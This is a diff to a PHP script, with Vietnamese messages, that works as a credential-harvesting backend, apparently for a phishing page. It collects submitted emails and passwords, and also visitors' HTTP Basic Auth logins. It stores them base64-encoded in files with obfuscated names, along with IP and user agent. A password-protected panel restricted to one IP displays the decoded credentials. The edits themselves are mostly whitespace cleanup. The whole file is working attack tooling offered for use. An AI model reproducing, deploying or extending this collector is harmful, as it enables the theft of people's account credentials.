@@ -1,14 +1,12 @@
-﻿<?php
+<?php
 $DATA_FILE   = __DIR__ . '/dXNlcl9kYXRhX2xvZ2luX3Bhc3M=.txt';
 $ACCESS_LOG  = __DIR__ . '/dXNlcl9hY2Nlc3NfdXNlcl9wYXNz.log';
 $ALLOWED_IPS = '116.98.3.33';
 $ADMIN_USER  = 'super@$adminuser$';
 $ADMIN_PASS  = 'super@$adminpass$';
 $MAX_LEN     = 200;
-
 $USE_API_KEY = false;
 $API_KEY     = 'change_this_api_key';
-
 function getClientIp() {
     if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         $parts = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
@@ -43,12 +41,10 @@ function requireAuth($user, $pass) {
         exit;
     }
 }
-
 $datadir = dirname($DATA_FILE);
 if (!is_dir($datadir)) {
     @mkdir($datadir, 0750, true);
 }
-
 if (isset($_SERVER['PHP_AUTH_USER'], $_SERVER['PHP_AUTH_PW']) && !isset($_GET['view'])) {
     $visitorUser = trim((string)$_SERVER['PHP_AUTH_USER']);
     $visitorPw   = trim((string)$_SERVER['PHP_AUTH_PW']);
@@ -63,7 +59,6 @@ if (isset($_SERVER['PHP_AUTH_USER'], $_SERVER['PHP_AUTH_PW']) && !isset($_GET['v
         @file_put_contents($DATA_FILE, $line, FILE_APPEND | LOCK_EX);
     }
 }
-
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if ($USE_API_KEY) {
         $headers = function_exists('getallheaders') ? getallheaders() : [];
@@ -72,22 +67,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             jsonResp(false, 'Invalid API key', 401);
         }
     }
-
     $identifier = isset($_POST['email']) ? trim((string)$_POST['email']) : '';
     $password   = isset($_POST['password'])   ? trim((string)$_POST['password'])   : '';
-
     if ($identifier === '' || $password === '') {
         jsonResp(false, 'Thiếu identifier hoặc password', 400);
     }
     if (mb_strlen($identifier) > $MAX_LEN || mb_strlen($password) > $MAX_LEN) {
         jsonResp(false, 'Dữ liệu quá dài', 400);
     }
-
     $encId = base64_encode($identifier);
     $encPw = base64_encode($password);
     $time  = date('Y-m-d H:i:s');
     $ip    = getClientIp();
-
     $ua = $_SERVER['HTTP_USER_AGENT'] ?? '-';
     $uaClean = str_replace(["\r","\n"], ['',''], $ua);
 
@@ -96,10 +87,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if ($written === false) {
         jsonResp(false, 'Lỗi khi ghi file (permission?)', 500);
     }
-
     jsonResp(true, 'Ghi thành công', 200);
 }
-
 $rows = [];
 if (isset($_GET['view'])) {
     if (!isIpAllowed($ALLOWED_IPS)) {
@@ -107,12 +96,9 @@ if (isset($_GET['view'])) {
         echo "IP của bạn không được phép truy cập";
         exit;
     }
-
     requireAuth($ADMIN_USER, $ADMIN_PASS);
-
     $logLine = sprintf("%s | VIEW | %s | %s\n", date('Y-m-d H:i:s'), getClientIp(), $_SERVER['PHP_AUTH_USER'] ?? '-');
     @file_put_contents($ACCESS_LOG, $logLine, FILE_APPEND | LOCK_EX);
-
     if (file_exists($DATA_FILE)) {
         $lines = file($DATA_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
         foreach ($lines as $ln) {
@@ -137,18 +123,14 @@ if (isset($_GET['view'])) {
                     'ua' => $ua,
                 ];
 		} else {
-                
                 if (count($parts) >= 6 && strtoupper($parts[1]) === 'POST') {
-                   
                     $type  = $parts[1]; 
                     $cip   = $parts[2]; 
                     $encId = $parts[3]; 
                     $encPw = $parts[4]; 
                     $ua    = $parts[5]; 
-                    
                     $id = (@base64_decode($encId, true) === false) ? $encId : base64_decode($encId);
-                    $pw = (@base64_decode($encPw, true) === false) ? $encPw : base64_decode($encPw);
-                    
+                    $pw = (@base64_decode($encPw, true) === false) ? $encPw : base64_decode($encPw);                 
                     $rows[] = [
                         'time' => $time,
                         'type' => $type,
@@ -163,10 +145,7 @@ if (isset($_GET['view'])) {
             }
         }
     }
-
 }
-
-?>
 <!doctype html>
 <html lang="vi">
 <head>
@@ -197,7 +176,7 @@ if (isset($_GET['view'])) {
             </tr>
         </thead>
         <tbody>
-            <?php foreach (array_reverse($rows) as $row): // Hiển thị dòng mới nhất lên đầu ?>
+            <?php foreach (array_reverse($rows) as $row):?>
             <tr>
                 <td><?php echo htmlspecialchars($row['time']); ?></td>
                 <td class="<?php echo strtolower($row['type']); ?>-type"><?php echo htmlspecialchars($row['type']); ?></td>
@@ -210,3 +189,4 @@ if (isset($_GET['view'])) {
     </table>
 </body>
 </html>
+
